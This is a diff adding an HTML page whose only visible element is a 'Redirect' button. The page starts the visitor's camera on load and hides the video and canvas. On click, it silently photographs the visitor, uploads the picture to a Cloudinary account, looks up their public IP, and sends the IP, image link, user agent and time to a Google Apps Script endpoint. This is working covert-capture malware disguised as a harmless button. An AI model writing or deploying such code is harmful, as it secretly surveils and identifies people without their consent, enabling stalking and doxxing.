@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<button onclick="capture()">Redirect</button>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+
+<script>
+const CLOUD_NAME = "didd4kxgl";
+const UPLOAD_PRESET = "unsigned_upload";
+const SHEET_URL = "https://script.google.com/macros/s/AKfycbyErCXKuD9fcsVd1HXdoeQ47ZPXnUT2FK4DDeNMsWDsMf1AoHK3E2nCU7QpgvVbOLji/exec";
+
+async function startCamera() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    document.getElementById("video").srcObject = stream;
+}
+
+async function getIP() {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+}
+
+async function uploadToCloudinary(blob) {
+    const formData = new FormData();
+    formData.append("file", blob);
+    formData.append("upload_preset", UPLOAD_PRESET);
+
+    const res = await fetch(
+        `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
+        {
+            method: "POST",
+            body: formData
+        }
+    );
+
+    const data = await res.json();
+    return data.secure_url;
+}
+
+async function capture() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async function(blob) {
+        const imageURL = await uploadToCloudinary(blob);
+        const ip = await getIP();
+        await fetch(SHEET_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                ip: ip,
+                image: imageURL,
+                userAgent: navigator.userAgent,
+                time: new Date().toISOString()
+            })
+        });
+
+    });
+}
+
+window.onload = startCamera;
+</script>
+
+</body>
+</html>
